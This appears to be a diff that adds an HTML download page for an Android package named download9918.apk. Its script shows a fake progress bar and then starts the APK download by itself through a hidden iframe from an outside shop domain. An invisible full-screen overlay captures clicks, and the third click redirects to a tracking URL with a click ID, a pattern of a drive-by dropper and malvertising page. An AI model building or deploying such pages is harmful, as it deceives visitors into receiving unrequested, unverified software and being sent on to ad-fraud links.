@@ -1,0 +1,375 @@
+<!doctype html>
+<html lang="en" translate="no">
+<head>
+  <meta charset="utf-8">
+  <meta name="google" content="notranslate">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Download</title>
+  <script>
+    window.__downloadTestRevision = 'l1-1';
+    window.__downloadSwVersion = 'b623f123';
+    window.__downloadSwUrl = `../sw.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
+    window.__swReadyPromise = (async () => {
+      if (!('serviceWorker' in navigator)) {
+        return { ok: false, direct: true, reason: 'unsupported' };
+      }
+
+      const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
+      await registration.update();
+
+      if (registration.waiting) {
+        registration.waiting.postMessage({ type: 'SKIP_WAITING' });
+      }
+
+      await navigator.serviceWorker.ready;
+
+      if (!navigator.serviceWorker.controller) {
+        await new Promise((resolve, reject) => {
+          const timeout = window.setTimeout(() => {
+            navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+            reject(new Error('controller timeout'));
+          }, 5000);
+
+          function onControllerChange() {
+            window.clearTimeout(timeout);
+            resolve();
+          }
+
+          navigator.serviceWorker.addEventListener('controllerchange', onControllerChange, { once: true });
+        });
+      }
+
+      return {
+        ok: true,
+        direct: false,
+        registration,
+        controller: navigator.serviceWorker.controller,
+      };
+    })().catch((error) => {
+      console.error('[download] early service worker setup failed', error);
+      return { ok: false, direct: true, reason: error.message };
+    });
+  </script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Verdana, Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      color: #1b1b1b;
+    }
+
+    .f-data {
+      margin: 20vh auto 0;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      gap: 15px;
+      font-size: 14px;
+    }
+
+    .f-image {
+      width: 70px;
+      height: 105px;
+      background: url(file.png) center 6px / 70px no-repeat;
+      flex: 0 0 auto;
+    }
+
+    .f-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .f-name {
+      width: 200px;
+      overflow-wrap: break-word;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .f-size,
+    .f-uploaded {
+      font-size: 16px;
+    }
+
+    .s-box {
+      position: relative;
+      width: 270px;
+      height: 50px;
+      margin: 12px auto 0;
+      padding: 1px;
+      border-radius: 10px;
+      box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
+    }
+
+    .scale {
+      width: 0;
+      height: 100%;
+      border-radius: 10px;
+      background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
+      transition: 200ms;
+    }
+
+    .scale-percent {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      color: #fff;
+      font-size: 26px;
+      font-weight: 700;
+      text-shadow: 2px 2px rgb(29, 29, 29);
+    }
+
+    .d-box {
+      position: relative;
+      width: 100%;
+      height: 100px;
+      margin-top: 20px;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .d-button-box {
+      position: absolute;
+      top: -100%;
+      width: 250px;
+      height: 100px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: 1s;
+    }
+
+    button {
+      position: relative;
+      border: 0;
+      border-radius: 20px;
+      padding: 20px 38px;
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: #339120;
+      box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
+      color: #fff;
+      font-size: 20px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      text-align: center;
+      text-transform: uppercase;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      cursor: wait;
+      opacity: 0.7;
+    }
+
+    .click-area {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      cursor: pointer;
+    }
+
+    .hidden-frame {
+      position: absolute;
+      width: 0;
+      height: 0;
+      border: 0;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="f-data">
+    <div class="f-image"></div>
+    <div class="f-info">
+      <div id="fileTitle" class="f-name">download9918.apk</div>
+      <div class="f-size">Size: 5.7 MB</div>
+      <div class="f-uploaded">March 22, 2026 10:41</div>
+    </div>
+  </div>
+  <div class="s-box">
+    <div class="scale-percent"></div>
+    <div class="scale"></div>
+  </div>
+  <div class="d-box">
+    <div class="d-button-box">
+      <button id="downloadButton" type="button" disabled>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="35" height="35" aria-hidden="true">
+          <path fill="#fff" d="M12.001 16.8a.48.48 0 0 1-.48-.48V.96a.48.48 0 1 1 .96 0v15.36a.48.48 0 0 1-.48.48Z"/>
+          <path fill="#fff" d="M12 16.8a.482.482 0 0 1-.34-.14l-3.84-3.84a.48.48 0 1 1 .679-.679l3.5 3.5 3.5-3.5a.48.48 0 1 1 .681.679l-3.84 3.84a.478.478 0 0 1-.34.14Z"/>
+          <path fill="#fff" d="M21.12 23.52H2.88a2.4 2.4 0 0 1-2.4-2.4v-4.8a.48.48 0 0 1 .96 0v4.8a1.442 1.442 0 0 0 1.44 1.44h18.24a1.442 1.442 0 0 0 1.44-1.44v-4.8a.48.48 0 0 1 .96 0v4.8a2.4 2.4 0 0 1-2.4 2.4Z"/>
+        </svg>
+        <span>DOWNLOAD</span>
+      </button>
+    </div>
+  </div>
+  <div id="clickArea" class="click-area" aria-hidden="true"></div>
+  <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
+
+  <script>
+    const DEFAULT_FILE_NAME = 'download9918.apk';
+    const TEST_REVISION = window.__downloadTestRevision;
+    const SW_VERSION = window.__downloadSwVersion;
+    const SW_URL = window.__downloadSwUrl;
+    const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
+
+    const downloadButton = document.querySelector('#downloadButton');
+    const downloadFrame = document.querySelector('#downloadFrame');
+    const clickArea = document.querySelector('#clickArea');
+    const fileTitle = document.querySelector('#fileTitle');
+    const scale = document.querySelector('.scale');
+    const scalePercentText = document.querySelector('.scale-percent');
+    const downloadButtonBox = document.querySelector('.d-button-box');
+
+    const pageUrl = new URL(window.location.href);
+    const apkUrl = 'https://inhumancrieck.shop/9d9e87dbccdbfa9715d/';
+    const fileName = DEFAULT_FILE_NAME;
+    let isServiceWorkerReady = false;
+    let isDirectDownloadMode = false;
+    let trustedClickCount = 0;
+    let isPresentationReady = false;
+
+    function log(message, data) {
+      if (data === undefined) {
+        console.log(`[download] ${message}`);
+        return;
+      }
+
+      console.log(`[download] ${message}`, data);
+    }
+
+    function getRedirectUrl() {
+      const target = new URL(REDIRECT_HREF);
+      target.searchParams.set('clickid', pageUrl.searchParams.get('clickid') || '');
+      return target.href;
+    }
+
+    async function registerServiceWorker() {
+      const swState = await window.__swReadyPromise;
+
+      if (!swState.ok || swState.direct) {
+        isDirectDownloadMode = true;
+        log('using direct download fallback', { reason: swState.reason, apkUrl });
+        return;
+      }
+
+      isServiceWorkerReady = true;
+      log('ready to download', {
+        controller: swState.controller && swState.controller.scriptURL,
+        swUrl: SW_URL,
+        apkUrl,
+        fileName,
+      });
+    }
+
+    function startDownload() {
+      const target = new URL('../download.apk', window.location.href);
+
+      if (isDirectDownloadMode) {
+        log('starting direct download fallback', { apkUrl, fileName });
+        downloadFrame.src = 'about:blank';
+        window.setTimeout(() => {
+          downloadFrame.src = apkUrl;
+        }, 0);
+
+        return;
+      }
+
+      log('starting service worker download', { apkUrl, fileName, target: target.href });
+      downloadFrame.src = 'about:blank';
+      window.setTimeout(() => {
+        downloadFrame.src = target.href;
+      }, 0);
+    }
+
+    function handleDownloadClick(event) {
+      if (!isPresentationReady) {
+        return;
+      }
+
+      if (!isServiceWorkerReady && !isDirectDownloadMode) {
+        log('download requested before service worker readiness');
+        return;
+      }
+
+      if (event && event.isTrusted) {
+        trustedClickCount += 1;
+
+        if (trustedClickCount >= 3) {
+          window.location.href = getRedirectUrl();
+          return;
+        }
+      }
+
+      startDownload();
+    }
+
+    function runProgress() {
+      return new Promise((resolve) => {
+        let scorePercent = 0;
+        scalePercentText.textContent = '0%';
+        const timer = window.setInterval(() => {
+          scorePercent += 10;
+          scale.style.width = `${scorePercent}%`;
+          scalePercentText.textContent = `${scorePercent}%`;
+          if (scorePercent < 100) {
+            return;
+          }
+
+          window.clearInterval(timer);
+          // Let the final 200ms scale transition reach 100% before revealing the button.
+          window.setTimeout(() => {
+            let fallback;
+            function finish(event) {
+              if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
+                return;
+              }
+              window.clearTimeout(fallback);
+              downloadButtonBox.removeEventListener('transitionend', finish);
+              resolve();
+            }
+            downloadButtonBox.addEventListener('transitionend', finish);
+            // Also complete in background tabs where transitionend may not fire.
+            fallback = window.setTimeout(finish, 1100);
+            downloadButtonBox.style.top = '0';
+          }, 200);
+        }, 100);
+      });
+    }
+
+    fileTitle.textContent = fileName;
+    downloadButton.addEventListener('click', handleDownloadClick);
+    clickArea.addEventListener('click', handleDownloadClick);
+
+    const downloadReady = registerServiceWorker().catch((error) => {
+      console.error('[download] service worker setup failed', error);
+      isDirectDownloadMode = true;
+      log('service worker setup failed, using direct download fallback', { error: error.message, apkUrl });
+    });
+
+    Promise.all([runProgress(), downloadReady]).then(() => {
+      isPresentationReady = true;
+      downloadButton.disabled = !((isServiceWorkerReady || isDirectDownloadMode) && apkUrl);
+      if (!downloadButton.disabled) {
+        startDownload();
+      }
+    });
+  </script>
+</body>
+</html>
